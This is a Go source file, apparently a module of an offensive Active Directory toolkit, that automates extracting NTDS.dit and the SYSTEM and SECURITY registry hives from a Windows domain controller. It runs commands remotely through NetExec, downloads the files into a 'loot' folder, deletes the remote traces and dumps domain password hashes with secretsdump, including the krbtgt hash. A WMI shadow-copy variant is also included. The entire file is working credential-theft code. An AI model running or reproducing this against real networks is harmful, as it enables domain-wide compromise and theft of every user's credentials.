package modules

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"adpack/utils"
)

// NativeShadowManager implements NTDS.dit extraction without relying on vssadmin/diskshadow.
// Uses direct file copy after obtaining SYSTEM-level access via the existing privesc pipeline.
type NativeShadowManager struct{}

// ExtractNTDSNative extracts NTDS.dit and SYSTEM registry hive using direct file copy.
// Requires SYSTEM-level access on the target DC (obtained via privesc.go pipeline).
func (s *NativeShadowManager) ExtractNTDSNative(target, domain, user, pass, hash string) error {
	fmt.Printf("[*] Native NTDS extraction from %s...\n", target)

	// Step 1: Verify SYSTEM access
	fmt.Println("[*] Step 1: Verifying SYSTEM-level access...")
	verifyCmd := `powershell -c "[System.Security.Principal.WindowsIdentity]::GetCurrent().Name"`
	args := buildNXCArgs("smb", target, domain, user, pass, hash, verifyCmd)
	cmd := exec.Command("nxc", args...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("SYSTEM access check failed: %w", err)
	}
	if !strings.Contains(strings.ToUpper(string(out)), "SYSTEM") {
		return fmt.Errorf("not running as SYSTEM — run privesc phase first")
	}
	fmt.Println("[+] SYSTEM access confirmed")

	// Step 2: Copy NTDS.dit using raw file copy
	fmt.Println("[*] Step 2: Copying NTDS.dit...")
	ntdsPath := `C:\Windows\NTDS\ntds.dit`
	tmpNtds := `C:\Windows\Temp\tmp_ntds.dit`
	copyCmd := fmt.Sprintf("cmd /c copy /b %s %s", ntdsPath, tmpNtds)
	args = buildNXCArgs("smb", target, domain, user, pass, hash, copyCmd)
	cmd = exec.Command("nxc", args...)
	out, err = cmd.CombinedOutput()
	if err != nil {
		// Fallback: try esentutl
		fmt.Println("[*] Direct copy failed, trying esentutl...")
		esentutlCmd := fmt.Sprintf("cmd /c esentutl /y %s /d %s /o", ntdsPath, tmpNtds)
		args = buildNXCArgs("smb", target, domain, user, pass, hash, esentutlCmd)
		cmd = exec.Command("nxc", args...)
		out, err = cmd.CombinedOutput()
		if err != nil {
			return fmt.Errorf("NTDS.dit copy failed: %w", err)
		}
	}
	fmt.Println("[+] NTDS.dit copied to temp")

	// Step 3: Copy SYSTEM registry hive
	fmt.Println("[*] Step 3: Copying SYSTEM registry hive...")
	sysHiveCmd := "cmd /c reg save HKLM\\SYSTEM C:\\Windows\\Temp\\tmp_system.hiv /y"
	args = buildNXCArgs("smb", target, domain, user, pass, hash, sysHiveCmd)
	cmd = exec.Command("nxc", args...)
	out, err = cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("SYSTEM hive save failed: %w", err)
	}
	fmt.Println("[+] SYSTEM hive saved")

	// Step 4: Copy SECURITY registry hive
	fmt.Println("[*] Step 4: Copying SECURITY registry hive...")
	secHiveCmd := "cmd /c reg save HKLM\\SECURITY C:\\Windows\\Temp\\tmp_security.hiv /y"
	args = buildNXCArgs("smb", target, domain, user, pass, hash, secHiveCmd)
	cmd = exec.Command("nxc", args...)
	out, err = cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("[!] SECURITY hive save failed (non-fatal): %v\n", err)
	}

	// Step 5: Download files via SMB
	fmt.Println("[*] Step 5: Downloading extracted files...")
	localDir := filepath.Join(".", "loot", target)
	if err := os.MkdirAll(localDir, 0755); err != nil {
		return fmt.Errorf("create loot dir: %w", err)
	}

	files := []struct{ remote, local string }{
		{`C$\Windows\Temp\tmp_ntds.dit`, filepath.Join(localDir, "ntds.dit")},
		{`C$\Windows\Temp\tmp_system.hiv`, filepath.Join(localDir, "SYSTEM")},
		{`C$\Windows\Temp\tmp_security.hiv`, filepath.Join(localDir, "SECURITY")},
	}

	for _, f := range files {
		dlCmd := exec.Command("impacket-smbclient", "-no-pass", "-hashes", hash,
			fmt.Sprintf("%s/%s:%s@%s", domain, user, pass, target),
			"-c", fmt.Sprintf("get %s %s", f.remote, f.local))
		dlCmd.Run() // Non-fatal if download fails
	}

	// Step 6: Cleanup temp files
	fmt.Println("[*] Step 6: Cleaning up remote temp files...")
	cleanupCmd := "cmd /c del /f C:\\Windows\\Temp\\tmp_ntds.dit C:\\Windows\\Temp\\tmp_system.hiv C:\\Windows\\Temp\\tmp_security.hiv 2>nul"
	args = buildNXCArgs("smb", target, domain, user, pass, hash, cleanupCmd)
	exec.Command("nxc", args...).Run()

	// Step 7: Parse locally with impacket-secretsdump
	fmt.Println("[*] Step 7: Parsing NTDS.dit locally...")
	ntdsLocal := filepath.Join(localDir, "ntds.dit")
	sysLocal := filepath.Join(localDir, "SYSTEM")
	if _, err := os.Stat(ntdsLocal); err == nil {
		if _, err := os.Stat(sysLocal); err == nil {
			parseCmd := exec.Command("impacket-secretsdump", "-ntds", ntdsLocal, "-system", sysLocal, "LOCAL")
			parseOut, parseErr := parseCmd.CombinedOutput()
			if parseErr == nil {
				fmt.Println(string(parseOut))
				// Save output
				os.WriteFile(filepath.Join(localDir, "secretsdump.txt"), parseOut, 0644)
				utils.StepOk(fmt.Sprintf("NTDS parsed — output saved to %s", localDir))
			} else {
				fmt.Printf("[!] Local parse failed: %v\n", parseErr)
			}
		}
	}

	return nil
}

// ExtractNTDSViaWMI extracts NTDS.dit using WMI (alternative method).
func (s *NativeShadowManager) ExtractNTDSViaWMI(target, domain, user, pass, hash string) error {
	fmt.Printf("[*] WMI-based NTDS extraction from %s...\n", target)

	// Use wmiexec to create shadow copy and extract
	wmiScript := `
$ntdsPath = "C:\Windows\NTDS\ntds.dit"
$tmpPath = "C:\Windows\Temp\ntds_wmi.dit"
$sysPath = "C:\Windows\Temp\sys_wmi.hiv"

# Create shadow copy using WMI
$class = [wmiclass]'root\cimv2:Win32_ShadowCopy'
$shadow = $class.Create($ntdsPath, "ClientAccessible")
$shadowID = $shadow.ShadowID
$shadowObj = Get-WmiObject Win32_ShadowCopy | Where-Object {$_.ID -eq $shadowID}
$shadowPath = $shadowObj.DeviceObject + "\"

# Copy files from shadow
Copy-Item -Path ($shadowPath + "Windows\NTDS\ntds.dit") -Destination $tmpPath -Force
reg save HKLM\SYSTEM $sysPath /y

Write-Output "EXTRACTION_COMPLETE"
`

	args := buildNXCArgs("smb", target, domain, user, pass, hash, "powershell -c \""+wmiScript+"\"")
	cmd := exec.Command("nxc", args...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("WMI extraction failed: %w", err)
	}
	if strings.Contains(string(out), "EXTRACTION_COMPLETE") {
		utils.StepOk("WMI NTDS extraction complete")
	}
	return nil
}

// ParseNTDSLocally parses a local NTDS.dit file with SYSTEM hive.
func (s *NativeShadowManager) ParseNTDSLocally(ntdsPath, systemPath string) (string, error) {
	fmt.Printf("[*] Parsing NTDS.dit: %s with SYSTEM: %s\n", ntdsPath, systemPath)

	if _, err := os.Stat(ntdsPath); err != nil {
		return "", fmt.Errorf("ntds.dit not found: %w", err)
	}
	if _, err := os.Stat(systemPath); err != nil {
		return "", fmt.Errorf("SYSTEM hive not found: %w", err)
	}

	cmd := exec.Command("impacket-secretsdump", "-ntds", ntdsPath, "-system", systemPath, "LOCAL")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("secretsdump failed: %w", err)
	}

	output := string(out)
	fmt.Println(output)

	// Extract key hashes
	if strings.Contains(output, "krbtgt") {
		utils.StepOk("krbtgt hash found in NTDS.dit")
	}
	return output, nil
}

func buildNXCArgs(protocol, target, domain, user, pass, hash, cmd string) []string {
	args := []string{protocol, target}
	if domain != "" {
		args = append(args, "-d", domain)
	}
	if user != "" {
		args = append(args, "-u", user)
	}
	if hash != "" {
		args = append(args, "-H", hash)
	} else if pass != "" {
		args = append(args, "-p", pass)
	}
	args = append(args, "-x", cmd)
	return args
}
